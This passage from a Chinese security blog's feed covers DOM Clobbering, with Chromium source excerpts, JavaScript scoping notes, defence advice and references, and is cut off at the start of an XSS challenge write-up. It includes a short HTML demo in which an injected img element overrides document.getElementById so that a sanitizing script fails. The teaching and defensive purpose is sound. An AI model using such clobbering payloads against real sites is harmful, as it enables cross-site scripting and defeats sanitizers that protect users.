&#x4E0A;&#x6D4B;&#x8BD5;&#x53EA;&#x80FD; hook &#x5230; domain &#xFF0C;&#x81F3;&#x4E8E; location &#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4E0D;&#x662F;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x5C3D;&#x7BA1;&#x56DE;&#x590D;&#x7684;&#x662F;&#x201D;Browsers allow hooking these properties. It doesn&#x2019;t matter&#x201D;</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x770B;&#x4E86;&#x4E00;&#x4E0B; Cookie &#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E24;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target="_blank" rel="noopener">Document::cookie</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">Document::cookie</span><span class="hljs-params">(ExceptionState&amp; exception_state)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  CountUse(WebFeature::kCookieGet);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetSecurityOrigin()-&gt;CanAccessCookies()) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (IsSandboxed(mojom::<span class="hljs-built_in">blink</span>::WebSandboxFlags::kOrigin))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;The document is sandboxed and lacks the &apos;allow-same-origin&apos; flag.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Url().ProtocolIs(<span class="hljs-string">&quot;data&quot;</span>))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;Cookies are disabled inside &apos;data:&apos; URLs.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      exception_state.ThrowSecurityError(<span class="hljs-string">&quot;Access is denied for this document.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GetSecurityOrigin()-&gt;IsLocal()) {</span><br><span class="line">    CountUse(WebFeature::kFileAccessedCookies);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!cookie_jar_)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> cookie_jar_-&gt;Cookies();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">CookieJar::Cookies()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">CookieJar::Cookies</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  KURL cookie_url = document_-&gt;CookieURL();</span><br><span class="line">  <span class="hljs-keyword">if</span> (cookie_url.IsEmpty())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  RequestRestrictedCookieManagerIfNeeded();</span><br><span class="line">  <span class="hljs-keyword">String</span> value;</span><br><span class="line">  backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(),</span><br><span class="line">                             document_-&gt;TopFrameOrigin(), &amp;value);</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x53CA;&#xFF0C;&#x867D;&#x7136; cookie &#x4E0D;&#x80FD;&#x88AB;&#x5B8C;&#x5168;&#x5B57;&#x7B26;&#x4E32;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x88AB; Clobbered &#x7684;&#x95EE;&#x9898;&#x5728;2&#x5E74;&#x524D;&#x4E5F;&#x6709;&#x4EBA;&#x62A5;&#x544A;&#x8FC7;&#x8FD9;&#x4E2A;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898; <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target="_blank" rel="noopener">document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>&#x53EA;&#x4E0D;&#x8FC7;&#x76EE;&#x524D;&#x7684;&#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x662F;&#x201D;Safari, Chrome and Firefox all behave the same here&#x201D;&#x3002;</p><h3 id="Document-Collection"><a href="#Document-Collection" class="headerlink" title="Document Collection"></a>Document Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Document &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">DocumentNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">DocumentNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> HTMLElement&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match images, forms, embeds, objects and iframes by name,</span></span><br><span class="line">  <span class="hljs-comment">// object by id, and images by id but only if they have</span></span><br><span class="line">  <span class="hljs-comment">// a name attribute (this very strange rule matches IE)</span></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) ||</span><br><span class="line">      (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed()))</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (html_image_element &amp;&amp; html_image_element-&gt;IsExposed())</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_ ||</span><br><span class="line">           element.GetIdAttribute() == name_;</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">const</span> AtomicString&amp; name_value = element.GetNameAttribute();</span><br><span class="line">    <span class="hljs-keyword">return</span> name_value == name_ ||</span><br><span class="line">           (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty());</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-Collection"><a href="#Window-Collection" class="headerlink" title="Window Collection"></a>Window Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Window &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">WindowNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">WindowNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Element&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match only images, forms, embeds and objects by name,</span></span><br><span class="line">  <span class="hljs-comment">// but anything by id</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) ||</span><br><span class="line">      IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (element.GetNameAttribute() == name_)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> element.GetIdAttribute() == name_;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Bouns"><a href="#Bouns" class="headerlink" title="Bouns"></a>Bouns</h2><h3 id="Tip-1-Global-Scope"><a href="#Tip-1-Global-Scope" class="headerlink" title="Tip 1 Global Scope"></a>Tip 1 Global Scope</h3><p>&#x7531;&#x4E8E; Dom Clobbering &#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E4B;&#x4E00;&#x5C31;&#x662F; hook &#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53C8;&#x7531;&#x4E8E; Javascript &#x662F;&#x4E00;&#x95E8;&#x5341;&#x5206;&#x795E;&#x5947;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x5982;&#x4E0B;&#x51E0;&#x70B9;</p><h4 id="&#x663E;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x663E;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x663E;&#x5F0F;&#x58F0;&#x660E;"></a>&#x663E;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> c = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{};</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.a);<span class="hljs-comment">//1</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.c);<span class="hljs-comment">//&#x192; () {}</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x9690;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x9690;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x9690;&#x5F0F;&#x58F0;&#x660E;"></a>&#x9690;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(a)</span></span>{</span></span><br><span class="line">    b = a + 1;</span><br><span class="line">  }</span><br><span class="line">  test(1);</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//2</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0D;&#x5E26;&#x6709;<strong>&#x58F0;&#x660E;&#x5173;&#x952E;&#x5B57;</strong>&#x7684;&#x53D8;&#x91CF;&#xFF0C;Javascript &#x4F1A;&#x81EA;&#x52A8;&#x6302;&#x8F7D;&#x5230;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0A;&#x3002;</p><h4 id="let-amp-var"><a href="#let-amp-var" class="headerlink" title="let &amp; var"></a>let &amp; var</h4><p>ES6 &#x4E2D;&#x65B0;&#x589E;&#x4E86;<code>let</code>&#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x6765;&#x58F0;&#x660E;&#x53D8;&#x91CF;&#x3002;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E;<code>var</code>&#xFF0C;&#x4F46;&#x662F;&#x6240;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x5728;<code>let</code>&#x547D;&#x4EE4;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x5185;&#x6709;&#x6548;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://es6.ruanyifeng.com/#docs/let#&#x57FA;&#x672C;&#x7528;&#x6CD5;" target="_blank" rel="noopener">let &#x57FA;&#x672C;&#x7528;&#x6CD5;</a></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a <span class="hljs-comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="hljs-comment">// 1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x4E2D;&#xFF0C;&#x5206;&#x522B;&#x7528;<code>let</code>&#x548C;<code>var</code>&#x58F0;&#x660E;&#x4E86;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x3002;&#x7136;&#x540E;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x5916;&#x8C03;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x62A5;&#x9519;&#xFF0C;<code>var</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x8FD4;&#x56DE;&#x4E86;&#x6B63;&#x786E;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x8868;&#x660E;&#xFF0C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x53EA;&#x5728;&#x5B83;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x6709;&#x6548;&#x3002;</p><p>&#x800C;&#x4E14;&#x6709;&#x4E9B;&#x5F88;&#x5947;&#x5999;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> a = b = <span class="hljs-number">6</span>;</span><br><span class="line"><span class="hljs-built_in">window</span>.a;<span class="hljs-comment">//undefined</span></span><br><span class="line"><span class="hljs-built_in">window</span>.b;<span class="hljs-comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Tip-2-Overwrite-function"><a href="#Tip-2-Overwrite-function" class="headerlink" title="Tip 2 Overwrite function"></a>Tip 2 Overwrite function</h3><p>&#x867D;&#x7136;&#x53EF;&#x4EE5; Clobber &#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x6211;&#x6CA1;&#x627E;&#x5230;&#x4EC0;&#x4E48;&#x65B9;&#x6CD5;&#x8BA9;&#x4ED6;&#x6267;&#x884C;&#x6211;&#x4EEC; Clobber &#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x76EE;&#x524D;&#x8C8C;&#x4F3C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x6807;&#x7B7E;&#x6765;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x662F;&#x5F15;&#x8D77;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x53EA;&#x80FD;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4E00;&#x5B9A;&#x573A;&#x666F;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//Do something with a.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E00;&#x4E2A; JS &#x4EE3;&#x7801;&#x5757;&#x867D;&#x7136;&#x5F15;&#x8D77;&#x4E86;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77; JS &#x5B8C;&#x5168;&#x505C;&#x6B62;&#x6267;&#x884C;&#xFF0C;JS &#x4F1A;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x7684;&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x3002;</p><h3 id="Tip-3-Prototype-Pollution"><a href="#Tip-3-Prototype-Pollution" class="headerlink" title="Tip 3 Prototype Pollution"></a>Tip 3 Prototype Pollution</h3><p>&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x53EF;&#x4EE5;&#x5417;&#xFF1F;</p><p>&#x6211;&#x76EE;&#x524D;&#x5C1D;&#x8BD5;&#x7684;&#x65B9;&#x6CD5;&#x8FD8;&#x6CA1;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x5C1D;&#x8BD5;&#x6210;&#x529F;&#x4E86;&#x4E00;&#x5B9A;&#x8981;&#x8DDF;&#x6211;&#x5206;&#x4EAB;&#xFF01;</p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><ol><li>&#x6700;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5224;&#x65AD;&#x6BCF;&#x4E2A;&#x53D8;&#x91CF;&#x9884;&#x671F;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x907F;&#x514D;&#x975E;&#x9884;&#x671F;&#x7C7B;&#x578B;&#x7684;&#x7BE1;&#x6539;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x53EF;&#x4EE5;&#x68C0;&#x67E5; Dom &#x8282;&#x70B9;&#x7684; attribute &#x5C5E;&#x6027;&#x662F;&#x5426;&#x5B9E;&#x9645;&#x4E0A;&#x662F; NamedNodeMap &#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x8BE5;&#x5C5E;&#x6027;&#x662F;&#x4E00;&#x4E2A; attributes &#x5C5E;&#x6027;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x653B;&#x51FB;&#x8005;&#x63D2;&#x5165;&#x7684; HTMLElement&#x3002;</li><li>&#x6BD5;&#x7ADF;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x51FA;&#x73B0;&#x5728;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x4EE3;&#x7801;&#x89C4;&#x8303;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF01;</li><li>&#x4F7F;&#x7528;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x7684;&#x5E93;&#xFF0C;&#x4F8B;&#x5982; DOMPurify &#x3002;</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf" target="_blank" rel="noopener">DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">DOM Clobbering Attack</a></p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">DOM Clobbering strikes back</a></p><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">Clobbering the clobbered &#x2014; Advanced DOM Clobbering</a></p><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</a></p><p>[DOM Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;.md](<a href="https://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">https://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;)</p><p><a href="https://cure53.de/dom" target="_blank" rel="noopener">Im DOM h&#xF6;rt Dich keiner schreien</a></p><p><a href="https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/" target="_blank" rel="noopener">Dec 20: Sanitising HTML &#x2013; the DOM clobbering issue</a></p><p><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">&#x8C08;&#x8C08; JavaScript &#x7684;&#x4F5C;&#x7528;&#x57DF;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/02/11/xssgame/</id>
        <title><![CDATA[XSS GAME]]></title>
        <updated>2021-02-12T10:29:56+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/02/11/xssgame/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/02/11/xssgame/"><![CDATA[<html><head></head><body><p>&#x8FC7;&#x5E74;&#x671F;&#x95F4;&#x73A9;&#x4E86;&#x4E00;&#x4E0B;&#x56FD;&#x5916;&#x7684;&#x4E00;&#x4E2A; XSS GAME&#xFF0C;&#x6536;&#x83B7;&#x9887;&#x4E30;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5B66;&#x4E60;&#x8FC7;&#x7A0B;&#x3002;&#x672C;&#x4EBA;&#x5BF9;&#x4E8E; JavaScript &#x4EE5;&#x53CA;&#x524D;&#x7AEF;&#x7684;&#x7406;&#x89E3;&#x4E0D;&#x6DF1;&#xFF0C;&#x6C34;&#x5E73;&#x4E5F;&#x4E0D;&#x9AD8;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x6709;&#x758F;&#x6F0F;&#x4E4B;&#x5904;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x65A7;&#x6B63;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5B89;&#x5168;&#x5BA2;&#xFF1A;<a href="https://www.anquanke.com/post/id/198496" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496</a></p></blockquote><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#x6240;&#x6709;&#x9898;&#x76EE;&#x7684;&#x76EE;&#x6807;&#x90FD;&#x662F;&#x5B9E;&#x73B0;<code>alert(1337)</code>&#x5373;&#x53EF;&#xFF0C;&#x6709;&#x7740;&#x4E0D;&#x540C;&#x7684;&#x96BE;&#x5EA6;</p><h2 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h2><p></p><figure class="highlight html 